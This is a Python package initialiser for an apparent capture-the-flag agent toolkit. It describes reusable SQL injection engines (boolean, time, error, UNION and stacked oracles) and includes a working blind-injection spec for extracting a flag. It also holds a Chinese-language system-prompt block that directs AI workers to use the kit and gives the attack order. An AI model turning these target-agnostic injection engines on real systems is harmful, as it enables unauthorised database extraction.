"""Reusable, target-agnostic attack engines for the workers.

The premise: a worker should never pay the same fixed cost twice. The fixed cost
of an injection is not the payload — it is the transport (no proxy, retries,
encoding), the positive control (does the oracle actually distinguish TRUE from
FALSE?), and the search loop (binary search, chunking, parallelism). Those are
identical on every target, and every worker that rewrites them pays again and
can get them subtly wrong.

So the engine lives here, and a challenge-specific script is a *spec*: how to
send the request, what wraps the injected condition, and how to read TRUE/FALSE
off the response. The spec is short and disposable; the engine is not edited.

    from ctfagent.kit import Session, BoolOracle, Extractor

    s = Session("http://target:8080")

    def probe(cond):
        r = s.get("/check", {"id": f"1' AND ({cond}) AND '1'='1"})
        return r.ok                      # or 'exists":true' in r.text

    o = BoolOracle(probe).calibrate()    # raises if the oracle cannot tell 1=1 from 1=2
    print(Extractor(o).read("SELECT flag FROM flag LIMIT 1"))

Measured cost of one character with this kit on the run-19 target: ~7 requests,
same as a hand-written script, but zero rewrite and the calibration is not
optional. A UNION path is one request per *value*, which is why ``STRATEGY``
puts it first.

``local_target.py`` is a deliberately vulnerable HTTP server bound to 127.0.0.1
with four injection shapes. It exists so ``python -m ctfagent.kit.selftest`` can
prove the engine works before anyone points it at a real target.
"""

from __future__ import annotations

from .http import Reply, Session, TransportError
from .sqli import (
    BoolOracle,
    ErrorOracle,
    Extractor,
    OracleError,
    StackedOracle,
    TimeOracle,
    UnionOracle,
    check_all,
)

__all__ = [
    "Reply",
    "Session",
    "TransportError",
    "BoolOracle",
    "ErrorOracle",
    "Extractor",
    "OracleError",
    "StackedOracle",
    "TimeOracle",
    "UnionOracle",
    "check_all",
    "PROMPT_BLOCK",
]

#: Injected into web workers' system prompt. Deliberately short: it names the
#: import path and shows one complete spec, because a worker that has to read a
#: module docstring to learn the shape will instead write the script it already
#: knows how to write — which is the cost this package exists to remove.
PROMPT_BLOCK = """\
# 注入工具包（先用它，别自己重写）

`from ctfagent.kit import Session, BoolOracle, TimeOracle, ErrorOracle, UnionOracle, Extractor`

这些是**与目标无关的引擎**：传输（自动关代理、重试）、校准（先用 `1=1`/`1=2`
证明这个 oracle 真能分辨真假，否则直接抛异常）、二分搜索、并发。
你只需要写 **spec** —— 请求发给谁、条件怎么包、响应里什么算真。~15 行。

```python
from ctfagent.kit import Session, BoolOracle, Extractor

s = Session("http://target:8080")            # 代理默认关闭

def probe(cond):
    r = s.get("/check", {"id": f"1' AND ({cond}) AND '1'='1"})
    return 'exists":true' in r.text          # 注意：返回 None 表示"没答案"，不是 False

o = BoolOracle(probe).calibrate()            # 分不清真假就抛 OracleError
print(Extractor(o).read("SELECT flag FROM flag LIMIT 1"))
```

**为什么必须先 `calibrate()`**：一个恒返回 False 的 oracle，和"这里没有注入"
长得一模一样。不校准就下"没有注入"的结论，是把坏探针当成阴性结果。

**顺序**（每一档比前一档便宜一个数量级，别跳过）：
错误回显 → UNION（一次请求读整个值）→ 布尔盲注（每字符 ~7 次请求）→ 时间盲注。

**先自检再打目标**：`python -m ctfagent.kit.selftest` 会起一个本地故意有洞的
靶子（四个注入面，flag 已知）并跑一遍引擎。它过了，说明工具是好的，之后读不到
东西才是目标的问题。

`python -m ctfagent.kit.templates` 列出五种可直接改的 spec 模板（布尔/时间/错误/
UNION/堆叠），复制一个改三行即可。
"""
